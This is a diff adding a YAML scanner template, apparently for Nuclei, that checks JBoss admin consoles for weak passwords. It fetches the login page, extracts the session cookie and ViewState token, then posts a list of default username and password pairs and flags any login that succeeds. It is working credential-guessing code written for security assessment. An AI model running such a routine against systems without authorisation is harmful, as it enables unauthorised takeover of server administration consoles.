@@ -1,0 +1,76 @@
+id: jboss-as-admin-console-weak-pass
+info:
+  name: JBoss Admin Console Weak Password
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: weak-password,jboss
+
+variables:
+  users:
+    - admin
+    - jboss
+  passwords:
+    - admin
+    - jboss
+    - 123456
+    - password1!
+    - ezoffice
+    - Admin123
+    - Admin12345
+    - vulhub
+
+http:
+  - raw:
+      - |
+        GET /admin-console/login.seam HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Please login"
+
+    extractors:
+      - type: regex
+        name: jsession_id
+        part: header
+        regex:
+          - "JSESSIONID=(.*?);"
+        internal: true
+      - type: regex
+        name: viewstate
+        part: body
+        regex:
+          - '<input type="hidden" name="javax\.faces\.ViewState" id="javax\.faces\.ViewState" value="(.*?)".*?/>'
+        internal: true
+
+  - raw:
+      - |
+        POST /admin-console/login.seam HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Cookie: JSESSIONID={{jsession_id}}
+
+        login_form=login_form&login_form%3Aname={{users}}&login_form%3Apassword={{passwords}}&login_form%3Asubmit=Login&javax.faces.ViewState={{viewstate}}
+
+    attack: pitchfork
+    payloads:
+      users:
+        - '{{users}}'
+      passwords:
+        - '{{passwords}}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "/admin-console/secure/summary.seam"
